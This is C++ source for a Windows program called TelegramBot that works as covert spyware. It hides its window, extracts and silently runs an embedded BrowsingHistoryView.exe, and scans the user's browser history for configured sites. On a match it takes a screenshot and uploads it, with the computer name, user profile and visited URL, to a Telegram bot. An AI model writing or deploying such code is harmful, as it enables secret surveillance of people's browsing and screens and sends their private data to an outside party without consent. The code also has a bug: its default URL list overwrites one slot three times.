// TelegramBot.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "TelegramBot.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <locale>
#include <codecvt>
#include <WinBase.h>
#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <queue>
#include <filesystem>
#include <ShellApi.h>
#include <curl/curl.h>
#include <direct.h>


using namespace Gdiplus;
using namespace std;
#pragma comment( lib, "gdiplus" )

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
VOID CALLBACK MyTimerProc(HWND hwnd, UINT message, UINT idTimer, DWORD dwTime);

struct History
{
    string url;
    string webBrowser;
    string userProfile;
    string visitTime;
};

#define TIMER           0
#define HISTORY_LENGTH  100

void GetUrlHistory();
void CheckUrlHistory();

void TakeScreenShot();
bool ScreenCapture(int x, int y, int width, int height, char* filename);
void BitmapToJpg(HBITMAP hbmpImage, int width, int height, char* filename);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

void ExtractBinResource();
void Init_Program();
void Read_Config();
void Write_Config();

void sendMessageAndPhoto(string path,string message);

string urls[100];
int urlCount = 0;
bool screenFlag = false;
int timerSleep = 5000;
string computerName;

string botToken;
string chatId;
queue<History> m_History;


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_TELEGRAMBOT, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);
    Init_Program();

    // Perform application initialization:
    if (!InitInstance(hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_TELEGRAMBOT));

    MSG msg;   
    
    
    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int)msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_TELEGRAMBOT));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_TELEGRAMBOT);
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
    hInst = hInstance; // Store instance handle in our global variable

    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

    if (!hWnd)
    {
        return FALSE;
    }

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
    ShowWindow(hWnd, SW_HIDE);
    SetTimer(hWnd, TIMER, timerSleep, MyTimerProc);
    return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        // Parse the menu selections:
        switch (wmId)
        {
        case IDM_EXIT:
            ExtractBinResource();
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
    }
    break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        // TODO: Add any drawing code that uses hdc here...
        EndPaint(hWnd, &ps);
    }
    break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

void GetUrlHistory() {

    ShellExecuteW(GetDesktopWindow(), _T("open"), _T("BrowsingHistoryView.exe"), _T("/HistorySourceFolder 1 /sort ~2 /VisitTimeFilterType 2 /VisitTimeFilterValue 1 /stext history.txt"), NULL, SW_HIDE);
      
}
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0;          // number of image encoders
    UINT size = 0;         // size of the image encoder array in bytes

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
    {
        return -1;  // Failure
    }

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
    {
        return -1;  // Failure
    }

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

void BitmapToJpg(HBITMAP hbmpImage, int width, int height, char* filename)
{
    Bitmap* p_bmp = Bitmap::FromHBITMAP(hbmpImage, NULL);
    //Bitmap *p_bmp = new Bitmap(width, height, PixelFormat32bppARGB);

    CLSID pngClsid;
    int result = GetEncoderClsid(L"image/jpeg", &pngClsid);
    if (result != -1)
        std::cout << "Encoder succeeded" << std::endl;
    else
        std::cout << "Encoder failed" << std::endl;
    p_bmp->Save(L"screen.jpg", &pngClsid, NULL);
    delete p_bmp;
}

bool ScreenCapture(int x, int y, int width, int height, char* filename)
{
    HDC hDc = CreateCompatibleDC(0);
    HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
    SelectObject(hDc, hBmp);
    BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
    BitmapToJpg(hBmp, width, height,filename);
    DeleteObject(hBmp);
    return true;
}
void TakeScreenShot() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    int x1 = 0;
    int y1 = 0;
    int x2 = GetSystemMetrics(SM_CXSCREEN);
    int y2 = GetSystemMetrics(SM_CYSCREEN);
    char filename[] = "screen.jpg";
    ScreenCapture(x1, y1, x2 - x1, y2 - y1, filename);

    //Shutdown GDI+
    GdiplusShutdown(gdiplusToken);
}
void CheckUrlHistory() {
    ifstream fin("history.txt", ios::binary);
    fin.seekg(0, ios::end);
    size_t size = (size_t)fin.tellg();

    //skip BOM
    fin.seekg(2, ios::beg);
    size -= 2;

    u16string u16((size / 2) + 1, '\0');
    fin.read((char*)&u16[0], size);

    string utf8 = wstring_convert<codecvt_utf8_utf16<char16_t>, char16_t>{}.to_bytes(u16);

    istringstream stream(utf8);
    
    //read url
    string header,content;
    History history[1000];
    int historyCount = 0;

    string line;
    while (getline(stream, line)) {

        for (int i = 0; i < 14; i++) {             
            getline(stream, line);
            size_t pos = 0;            
            string delimiter = ":";
            pos = line.find(delimiter);
            header = line.substr(0, pos);
            line.erase(0, pos + delimiter.length());                
            content = line;
            content.erase(content.size() - 1, 1);
            content.erase(0, 1);
            if (header.compare("URL               ") == 0)
                history[historyCount].url = content;           

            if (header.compare("Web Browser       ") == 0)
                history[historyCount].webBrowser = content;

            if (header.compare("User Profile      ") == 0)
                history[historyCount].userProfile = content;

            if (header.compare("Visit Time        ") == 0)
                history[historyCount].visitTime = content;
        }        
        getline(stream, line);
        
        historyCount++;
    }   
    
    if (m_History.size() == 0) {
        int index = 0;
        int position = 0;

        int len = HISTORY_LENGTH;
        if (len > historyCount)
            len = historyCount;
    
        for (int i = len - 1; i >= 0; i--) {
            m_History.push(history[i]);
            for (int j = 0; j < urlCount; j++) {

                if ((index = history[i].url.find(urls[j], position)) != string::npos) {
                    ofstream outFile("output.txt", ios::out);
                    string output = computerName + "-" + history[i].userProfile + " visit " + history[i].url + " on " + history[i].webBrowser ;
                    outFile << output << endl;
                    outFile.close();

                    if (screenFlag) {
                        TakeScreenShot();
                        char buff[FILENAME_MAX]; //create string buffer to hold path
                        _getcwd(buff, FILENAME_MAX);
                        string path(buff);
                        path += "/screen.jpg";
                        sendMessageAndPhoto(path, output);

                    }
                }
            }
        }
    }
    else {
        History last = m_History.back();
        int index = -1;
        int position = 0;

        for (int i = 0; i < historyCount; i++) {
            if (history[i].url.compare(last.url) == 0 && 
                history[i].webBrowser.compare(last.webBrowser) == 0 &&
                history[i].visitTime.compare(last.visitTime) == 0) {

                index = i;
                break;
            }
        }

        for (int i = 0; i < index; i++) {
            if (m_History.size() > 0)
                m_History.pop();            
        }

        for (int i = index - 1; i >= 0; i--) {
            m_History.push(history[i]);
            for (int j = 0; j < urlCount; j++) {

                if ((index = history[i].url.find(urls[j], position)) != string::npos) {
                    ofstream outFile("output.txt", ios::out);
                    string output = computerName + "-" + history[i].userProfile + " visit " + history[i].url + " on " + history[i].webBrowser;
                    outFile << output << endl;
                    outFile.close();

                    if (screenFlag) {
                        TakeScreenShot();
                        char buff[FILENAME_MAX]; //create string buffer to hold path
                        _getcwd(buff, FILENAME_MAX);
                        string path(buff);
                        path += "/screen.jpg";
                        sendMessageAndPhoto(path, output);;
                    }
                }
            }
        }
    }

    
}
VOID CALLBACK MyTimerProc(HWND hwnd, UINT message, UINT idTimer, DWORD dwTime) {

    if (idTimer == TIMER) {
        GetUrlHistory();
        
        CheckUrlHistory();
    }
}

void ExtractBinResource() {
    HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.
    char* lpResLock;        // pointer to resource data
    DWORD   dwSizeRes;

    const char* filename = "BrowsingHistoryView.exe";
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(IDR_BIN1), _T("BIN"));

    hResourceLoaded = LoadResource(NULL, hRes);
    lpResLock = (char*)LockResource(hResourceLoaded);
    dwSizeRes = SizeofResource(NULL, hRes);

    ofstream outputFile(filename, ios::binary);
    outputFile.write((const char*)lpResLock, dwSizeRes);
    outputFile.close();
}

void Write_Config() {
    ofstream configFile("config.ini");
    
    configFile << "[urlfilter] = yahoo.com,msn.com,google.com" << endl;
    configFile << "[screenshot] = ON" << endl;
    configFile << "[checkforurl] = 3" << endl;
    configFile << "[bottoken] = " << endl;
    configFile << "[chat_id] = " << endl;
    configFile.close();

    urlCount = 3;
    urls[0] = "yahoo.com";
    urls[0] = "msn.com";
    urls[0] = "google.com";

    botToken = "";
    chatId = "";

    screenFlag = true;
    timerSleep = 3000;
}

void Read_Config() {
    ifstream configFile("config.ini");
    string line;
    string header;
    string assign;

    if (configFile.is_open()) {
        // get url config
        configFile >> header;
        if (header.compare("[urlfilter]") == 0) {
            configFile >> assign;
            configFile >> line;
            string delimiter = ",";

            size_t pos = 0;
            string token;
            while ((pos = line.find(delimiter)) != string::npos) {
                token = line.substr(0, pos);                
                line.erase(0, pos + delimiter.length());
                urls[urlCount] = token;
                urlCount++;
            }            
            urls[urlCount] = line;
            urlCount++;
        }
        
        configFile >> header;
        if (header.compare("[screenshot]") == 0) {
            configFile >> assign;
            configFile >> line;
            if (line.compare("ON") == 0)
                screenFlag = true;
            else if (line.compare("OFF") == 0)
                screenFlag = false;
        }

        configFile >> header;
        if (header.compare("[checkforurl]") == 0) {
            configFile >> assign;
            configFile >> line;
            timerSleep = 1000 * atoi(line.c_str());
        }

        configFile >> header;
        if (header.compare("[bottoken]") == 0) {
            configFile >> assign;
            configFile >> botToken;            
        }

        configFile >> header;
        if (header.compare("[chat_id]") == 0) {
            configFile >> assign;
            configFile >> chatId;            
        }

    }    
    
}

void Init_Program() {

    ifstream browsing("BrowsingHistoryView.exe");
    if (!browsing.good())
        ExtractBinResource();

    ifstream config("config.ini");
    if (config.good())
        Read_Config();
    else
        Write_Config();

    TCHAR  infoBuf[32767];
    DWORD  bufCharCount = 32767;

    GetComputerName(infoBuf, &bufCharCount);    
    wstring arr_w(infoBuf);
    string arr_s(arr_w.begin(), arr_w.end());

    computerName = arr_s;
}

void sendMessageAndPhoto(string path,string message) {
    CURLcode ret;
    CURL* hnd;
    curl_mime* mime1;
    curl_mimepart* part1;

    mime1 = NULL;
    string url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
    hnd = curl_easy_init();
    curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
    curl_easy_setopt(hnd, CURLOPT_URL, url.c_str());
    curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
    mime1 = curl_mime_init(hnd);
    part1 = curl_mime_addpart(mime1);
    curl_mime_data(part1, chatId.c_str(), CURL_ZERO_TERMINATED);
    curl_mime_name(part1, "chat_id");
    part1 = curl_mime_addpart(mime1);
    
    curl_mime_filedata(part1, path.c_str());
    curl_mime_name(part1, "photo");
    curl_easy_setopt(hnd, CURLOPT_MIMEPOST, mime1);
    curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.79.1");
    curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
    curl_easy_setopt(hnd, CURLOPT_CUSTOMREQUEST, "POST");
    curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
    curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 1L);
    part1 = curl_mime_addpart(mime1);
    curl_mime_name(part1, "caption");
    curl_mime_data(part1, message.c_str(), CURL_ZERO_TERMINATED);

    ret = curl_easy_perform(hnd);

    curl_easy_cleanup(hnd);
    hnd = NULL;
    curl_mime_free(mime1);
    mime1 = NULL;

}